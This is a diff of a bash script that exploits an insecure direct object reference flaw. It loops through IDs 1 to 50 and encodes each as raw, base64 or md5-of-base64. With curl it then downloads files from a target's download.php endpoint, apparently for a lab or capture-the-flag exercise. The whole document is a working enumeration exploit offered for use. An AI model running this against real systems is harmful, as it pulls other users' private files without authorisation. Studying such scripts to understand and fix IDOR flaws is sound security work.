@@ -1,25 +1,36 @@
 #!/bin/bash
 
-# Description: Enumerates IDOR-protected files by reversing frontend hashing logic (base64 + md5)
-# Usage: ./idor-hash-enum-downloader.sh http://TARGET
+# Description: IDOR enumeration script (supports raw, base64, md5(base64))
+# Usage: ./idor-enum-downloader.sh http://TARGET mode
+# Modes: raw | base64 | md5
 
 url=$1
+mode=$2
 
-if [ -z "$url" ]; then
-    echo "Usage: $0 http://TARGET"
+if [ -z "$url" ] || [ -z "$mode" ]; then
+    echo "Usage: $0 http://TARGET [raw|base64|md5]"
     exit 1
 fi
 
-for i in {1..10}; do
-    echo "[+] Processing ID: $i"
+for i in {1..50}; do
+    case $mode in
+        raw)
+            value=$i
+            ;;
+        base64)
+            value=$(echo -n $i | base64 -w 0)
+            ;;
+        md5)
+            value=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+            ;;
+        *)
+            echo "Invalid mode"
+            exit 1
+            ;;
+    esac
 
-    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+    echo "[+] Testing ID: $i"
 
-    curl -s -X POST \
-        -d "contract=$hash" \
-        "$url/download.php" \
-        -o "contract_$hash.pdf"
+    curl -s "$url/download.php?contract=$value" -O
 
 done
-
-echo "[+] Done."
